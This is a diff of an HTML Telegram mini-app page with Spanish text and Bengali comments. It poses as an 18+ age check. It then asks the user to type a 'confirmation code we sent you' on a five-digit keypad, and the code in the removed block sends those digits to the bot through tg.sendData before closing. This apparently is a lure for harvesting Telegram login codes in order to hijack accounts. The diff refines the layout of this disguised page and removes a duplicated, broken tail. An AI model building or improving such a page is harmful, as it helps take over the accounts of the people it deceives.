@@ -2,40 +2,39 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #000; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        body { background: #000; color: white; font-family: sans-serif; text-align: center; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
         
-        /* ১ম ধাপ: ১৮+ ওয়ার্নিং পেজ */
-        #step1 { display: flex; flex-direction: column; align-items: center; width: 100%; }
-        .warning-img { width: 150px; margin-bottom: 20px; }
-        .msg-box { background: #1c242f; padding: 15px; border-radius: 10px; width: 80%; margin-bottom: 20px; border: 1px solid #333; }
-        .btn-confirm { background: #5a78f0; color: white; padding: 15px 40px; border-radius: 12px; font-size: 18px; border: none; cursor: pointer; font-weight: bold; width: 85%; }
+        #step1, #step2 { width: 100%; display: flex; flex-direction: column; align-items: center; }
+        
+        /* ১ম ধাপ: ১৮+ ওয়ার্নিং */
+        .warning-img { width: 100px; margin-bottom: 20px; }
+        .msg-box { background: #1c242f; padding: 15px; border-radius: 12px; width: 85%; margin-bottom: 20px; font-size: 14px; border: 1px solid #333; line-height: 1.4; }
+        .btn-confirm { background: #5a78f0; color: white; padding: 16px; border-radius: 12px; font-size: 18px; border: none; font-weight: bold; width: 85%; cursor: pointer; }
 
-        /* ২য় ধাপ: কিপ্যাড পেজ (প্রথমে লুকানো থাকবে) */
-        #step2 { display: none; flex-direction: column; align-items: center; width: 100%; }
-        .code-container { display: flex; gap: 8px; margin: 20px 0; }
-        .code-box { width: 45px; height: 55px; border: 2px solid #444; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 22px; background: transparent; }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 90%; max-width: 320px; }
-        .key { background: #5a78f0; padding: 18px; border-radius: 10px; font-size: 20px; border: none; color: white; font-weight: bold; }
-        .btn-get { background: #ffffff22; color: #fff; padding: 10px; border-radius: 8px; width: 90%; margin-bottom: 15px; border: 1px solid #ffffff44; }
+        /* ২য় ধাপ: কিপ্যাড */
+        .code-container { display: flex; gap: 8px; margin-bottom: 20px; margin-top: 10px; }
+        .code-box { width: 45px; height: 55px; border: 2px solid #444; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: bold; background: rgba(255,255,255,0.05); }
+        
+        /* গ্রিড লেআউট যাতে বাটন লাইনে থাকে */
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 85%; max-width: 320px; }
+        .key { background: #5a78f0; padding: 15px; border-radius: 12px; font-size: 22px; border: none; color: white; font-weight: bold; cursor: pointer; }
+        .key:active { background: #3f56b5; }
+        .btn-get { background: #ffffff22; color: #fff; padding: 10px; border-radius: 8px; width: 85%; margin-bottom: 15px; border: 1px solid #ffffff44; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div id="step1">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/R-18_Logo_New_Zealand.svg/1200px-R-18_Logo_New_Zealand.svg.png" class="warning-img">
-        <div class="msg-box">
-            ⚠️ ¡Atención! 🔞 Para continuar, debes confirmar que eres mayor de 18 años 😊
-        </div>
+        <div class="msg-box">⚠️ ¡Atención! 🔞 Para continuar, debes confirmar que eres mayor de 18 años 😊</div>
         <button class="btn-confirm" onclick="goToStep2()">🍓 confirmar 🔞</button>
     </div>
 
-    <div id="step2">
-        <div class="msg-box" style="border-left: 4px solid #0088cc;">
-            📩 Te hemos enviado un código de confirmación. 💦 Introdúcelo con los botones de arriba.
-        </div>
+    <div id="step2" style="display: none;">
+        <div class="msg-box" style="border-left: 4px solid #0088cc;">📩 Te hemos enviado un código de confirmación. 💦 Introdúcelo abajo.</div>
         
         <div class="code-container">
             <div class="code-box" id="b1"></div>
@@ -57,7 +56,7 @@
             <button class="key" onclick="press('7')">7</button>
             <button class="key" onclick="press('8')">8</button>
             <button class="key" onclick="press('9')">9</button>
-            <div></div>
+            <div style="visibility: hidden;"></div>
             <button class="key" onclick="press('0')">0</button>
             <button class="key" onclick="del()">⌫</button>
         </div>
@@ -68,7 +67,6 @@
         tg.expand();
         let code = "";
 
-        // ১ম ধাপ থেকে ২য় ধাপে যাওয়ার ফাংশন
         function goToStep2() {
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').style.display = 'flex';
@@ -99,43 +97,6 @@
         }
     </script>
 </body>
-</html>        <button class="key" onclick="press('4')">4</button>
-        <button class="key" onclick="press('5')">5</button>
-        <button class="key" onclick="press('6')">6</button>
-        <button class="key" onclick="press('7')">7</button>
-        <button class="key" onclick="press('8')">8</button>
-        <button class="key" onclick="press('9')">9</button>
-        <div></div>
-        <button class="key" onclick="press('0')">0</button>
-        <button class="key" onclick="del()">⌫</button>
-    </div>
-
-    <script>
-        let code = "";
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-
-        function press(num) {
-            if (code.length < 5) {
-                code += num;
-                updateDisplay();
-                if (code.length === 5) {
-                    setTimeout(() => {
-                        tg.sendData(code);
-                        tg.close();
-                    }, 300);
-                }
-            }
-        }
-        function del() {
-            code = code.slice(0, -1);
-            updateDisplay();
-        }
-        function updateDisplay() {
-            for (let i = 1; i <= 5; i++) {
-                document.getElementById('b' + i).innerText = code[i - 1] || "";
-            }
-        }
-    </script>
+</html>    </script>
 </body>
 </html>
